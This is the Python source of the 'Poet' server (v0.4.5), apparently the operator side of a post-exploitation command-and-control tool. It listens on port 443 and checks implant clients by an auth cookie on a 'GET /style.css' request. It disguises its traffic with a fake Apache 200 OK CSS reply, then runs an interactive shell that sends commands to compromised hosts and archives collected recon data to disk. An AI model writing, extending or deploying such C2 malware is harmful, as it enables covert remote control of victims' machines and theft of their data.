#!/usr/bin/python2.7

import os
import sys
import zlib
import base64
import socket
import os.path
import argparse
from datetime import datetime

import debug
import module
import config as CFG
from poetsocket import *

__version__ = '0.4.5'

POSH_PROMPT = 'posh > '
FAKEOK = """HTTP/1.1 200 OK\r
Date: Tue, 19 Mar 2013 22:12:25 GMT\r
Server: Apache\r
X-Powered-By: PHP/5.3.10-1ubuntu3.2\r
Content-Length: 364\r
Content-Type: text/plain\r
\r
body{background-color:#f0f0f2;margin:0;padding:0;font-family:"Open Sans","Helvetica Neue",Helvetica,Arial,sans-serif}div{width:600px;margin:5em auto;padding:50px;background-color:#fff;border-radius:1em}a:link,a:visited{color:#38488f;text-decoration:none}@media (max-width:700px){body{background-color:#fff}div{width:auto;margin:0 auto;border-radius:0;padding:1em}}"""


class PoetSocketServer(PoetSocket):
    def __init__(self, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('', port))
        self.s.listen(1)

    def accept(self):
        return self.s.accept()


class PoetServer(object):
    """Core server functionality.

    Implements control shell, and necessary helper functions.

    Attributes:
        s: socket instance for initial client connection
        conn: socket instance for actual client communication
        cmds: list of supported control shell commands
    """

    def __init__(self, s):
        self.s = s
        self.conn = None
        self.builtins = {
            'exit': self._builtin_exit,
            'help': self._builtin_help
        }
        # exists so modules can stop server (used by selfdestruct and exit)
        self.continue_ = True

    def start(self):
        """Poet server control shell."""

        debug.info('Entering control shell')
        self.conn = PoetSocket(self.s.accept()[0])
        print 'Welcome to posh, the Poet Shell!'
        print 'Running `help\' will give you a list of supported commands.'
        while True:
            try:
                argv = raw_input(POSH_PROMPT).split()
                if not argv:
                    continue

                if argv[0] in self.builtins:
                    self.builtins[argv[0]](argv)
                elif argv[0] in module.server_commands:
                    try:
                        module.server_commands[argv[0]](self, argv)
                    except Exception as e:
                        self.info(str(e.args))
                else:
                    self.info('{}: command not found'.format(argv[0]))

                # see comment above for self.continue_ for why this is here
                if not self.continue_:
                    break
            except KeyboardInterrupt:
                print
                continue
            except EOFError:
                print
                break
        self.conn.send('fin')
        debug.info('Exiting control shell')

    def info(self, msg):
        print 'posh : {}'.format(msg)

    def generic(self, req, write_flag=False, write_file=None):
        """Abstraction layer for exchanging with client and writing to file.

        Args:
            req: command to send to client
            write_flag: whether client response should be written
            write_file: optional filename to use for file
        """

        resp = self.conn.exchange(req)
        # TODO: this hardcoding is bad, should be some generic way to see
        # if response should be decompressed. maybe a list of all keywords
        # which cause a compressed response to come back
        if req == 'recon':
            resp = zlib.decompress(resp)
        print resp
        if write_flag:
            self.write(resp, req.split()[0], write_file)

    def write(self, response, prefix, write_file=None):
        """Write to server archive.

        Args:
            response: data to write
            prefix: directory to write file to (usually named after command
                    executed)
            write_file: optional filename to use for file
        """

        ts = datetime.now().strftime('%Y%m%d%M%S')
        out_ts_dir = '{}/{}'.format(CFG.ARCHIVE_DIR, ts[:len('yyyymmdd')])
        out_prefix_dir = '{}/{}'.format(out_ts_dir, prefix)

        # create filename to write to
        if write_file:
            chunks = write_file.split('.')
            # separate the file extension from the file name, default to .txt
            ext = '.{}'.format('.'.join(chunks[1:])) if chunks[1:] else '.txt'
            outfile = '{}/{}-{}{}'.format(out_prefix_dir, chunks[0], ts, ext)
        else:
            outfile = '{}/{}-{}.txt'.format(out_prefix_dir, prefix, ts)

        # create directories if they don't exist
        if not os.path.isdir(CFG.ARCHIVE_DIR):
            os.mkdir(CFG.ARCHIVE_DIR)
        if not os.path.isdir(out_ts_dir):
            os.mkdir(out_ts_dir)
        if not os.path.isdir(out_prefix_dir):
            os.mkdir(out_prefix_dir)

        # if file already exists, append unique digit to the end
        if os.path.exists(outfile):
            count = 1
            orig_outfile = outfile
            outfile = orig_outfile + '.{}'.format(count)
            while os.path.exists(outfile):
                outfile = orig_outfile + '.{}'.format(count)
                count += 1

        with open(outfile, 'w') as f:
            f.write(response)
            print 'posh : {} written to {}'.format(prefix, outfile)

    def exec_preproc(self, inp):
        """Parse posh `exec' command line.

        Args:
            inp: raw `exec' command line

        Returns:
            Tuple suitable for expansion into as self.generic() parameters.
        """

        tmp = inp.split()
        write_file = None
        write_flag = tmp[1] == '-o'
        if write_flag:
            if '"' not in tmp[2]:
                write_file = tmp[2]
                del tmp[2]
            del tmp[1]
        tmp = ' '.join(tmp)
        return tmp, write_flag, write_file
    
    def _builtin_exit(self, argv):
        self.continue_ = False

    def _builtin_help(self, argv):
        print 'Builtins:\n  {}'.format('\n  '.join(sorted(self.builtins.keys())))
        print
        print 'Commands:\n  {}'.format('\n  '.join(sorted(module.server_commands.keys())))



def get_args():
    """ Parse arguments and return dictionary. """

    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port')
    parser.add_argument('-v', '--version', action='store_true',
                        help='prints the Poet version number and exits')
    return parser.parse_args()


def print_header():
    """ Prints big ASCII logo and other info. """

    print """
                          _
        ____  ____  ___  / /_
       / __ \/ __ \/ _ \/ __/
      / /_/ / /_/ /  __/ /
     / .___/\____/\___/\__/     v{}
    /_/
""".format(__version__)


def die(msg=None):
    if msg:
        debug.err(msg)
    debug.err('Poet server terminated')
    sys.exit(0)


def authenticate(ping):
    """Verify that the client is in fact connecting by checking the request
    path and the auth token contained in the cookie.

    Args:
        ping: http request sent from client (string)

    Returns:
        None: client authenticated successfully
        str: the reason authentication failed
    """

    if ping.startswith('GET /style.css HTTP/1.1'):
        if 'Cookie: c={};'.format(base64.b64encode(CFG.AUTH)) in ping:
            return None
        else:
            return 'AUTH TOKEN'
    else:
        return 'REQUEST'


def drop_privs():
    try:
        new_uid = int(os.getenv('SUDO_UID'))
        new_gid = int(os.getenv('SUDO_GID'))
    except TypeError:
        # they were running directly from a root user and didn't have
        # sudo env variables
        print """[!] WARNING: Couldn't drop privileges! To avoid this error, run from a non-root user.
    You may also use sudo, from a non-root user. Continue? (y/n)""",
        if raw_input().lower()[0] == 'y':
            return
        die()

    debug.info('Dropping privileges to uid: {}, gid: {}'.format(new_uid,
                                                                new_gid))

    # drop group before user, because otherwise you're not privileged enough
    # to drop group
    os.setgroups([])
    os.setregid(new_gid, new_gid)
    os.setreuid(new_uid, new_uid)

    # check to make sure we can't re-escalate
    try:
        os.seteuid(0)
        print '[!] WARNING: Failed to drop privileges! Continue? (y/n)',
        if raw_input().lower()[0] != 'y':
            die()
    except OSError:
        return


def main():
    args = get_args()
    if args.version:
        print 'Poet version {}'.format(__version__)
        sys.exit(0)
    print_header()
    PORT = int(args.port) if args.port else 443
    try:
        s = PoetSocketServer(PORT)
    except socket.error as e:
        if e.errno == 13:
            die('You need to be root!')
    if os.geteuid() == 0:
        drop_privs()
    debug.info('Poet server started on port: {}'.format(PORT))
    module.load_modules()
    while True:
        try:
            conn, addr = s.accept()
        except KeyboardInterrupt:
            die()
        conntime = datetime.now().strftime(debug.DATE_FMT)
        ping = conn.recv(SIZE)
        if not ping:
            die('Socket error: {}'.format(e.message))
        auth_err = authenticate(ping)
        if auth_err:
            print '[!] ({}) Connected By: {} -> INVALID! ({})'.format(conntime, addr, auth_err)
            conn.close()
        else:
            print '[+] ({}) Connected By: {} -> VALID'.format(conntime, addr)
            conn.send(FAKEOK)
            conn.close()
            try:
                PoetServer(s).start()
                break
            except Exception as e:
                print e
                die('Fatal error: {}'.format(e.message))
    die()

if __name__ == '__main__':
    main()
